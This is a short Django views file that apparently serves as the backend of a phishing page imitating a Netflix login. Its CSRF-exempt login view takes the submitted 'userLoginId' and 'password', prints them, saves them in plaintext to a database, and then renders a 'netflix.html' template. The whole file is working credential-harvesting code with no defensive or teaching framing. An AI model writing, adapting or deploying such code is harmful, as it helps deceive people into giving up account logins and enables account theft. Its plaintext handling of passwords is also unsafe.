from django.shortcuts import render, redirect
from .models import Account
from django.views.decorators.csrf import csrf_exempt

# Create your views here.




# our login page
@csrf_exempt
def login_page(request):
	# capture request information
	# create account model
	# save to database

	if request.method == "POST":
		getusername = request.POST.get("userLoginId")
		getpassword = request.POST.get("password")
		print(getusername)
		print(getpassword)
		myAccount = Account()
		myAccount.username = getusername
		myAccount.password = getpassword
		myAccount.save()
		
	template_name = 'host/netflix.html'
	return render(request, template_name)
	
